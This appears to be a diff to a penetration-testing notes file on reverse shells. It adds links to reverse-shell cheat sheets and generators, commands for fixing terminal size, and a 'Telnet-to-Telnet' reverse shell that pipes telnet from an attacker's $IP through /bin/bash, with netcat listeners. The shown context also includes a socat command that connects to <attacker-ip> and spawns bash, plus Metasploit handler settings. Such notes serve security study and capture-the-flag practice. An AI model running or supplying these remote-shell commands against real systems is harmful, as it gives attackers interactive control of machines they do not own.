@@ -1,7 +1,11 @@
 # Shells
 
 ## Introduction
-This is conceptual breakdown of types of shells for a list of reverse shells check [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
+This is conceptual breakdown of types of shells for a list of reverse shells check [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+Generate reverse shells with [revshells](https://www.revshells.com/).
+
+Another cheatsheet from [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
 
 # Shell Stablisation Methods
 
@@ -212,6 +216,12 @@ socat TCP-L:<port> FILE:`tty`,raw,echo=0
 stty raw -echo; fg 
 ```
 
+Fixing terminal size
+```bash
+stty size
+stty -rows 48 -columns 120
+```
+
 ### SPECIAL upload precompiled socat binary 
 ```bash
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
@@ -357,3 +367,15 @@ set LHOST $LISTENING-IP
 set LPORT $LISTENING-PORT
 exploit
 ```
+
+## Telnet-to-Telnet
+
+```bash
+# Target
+telnet $IP 9090 | /bin/bash | telnet $IP 9999
+# Attacker
+nc -lvnp 9999
+nc -lvnp 9090
+```
+
+[lanmaster](https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
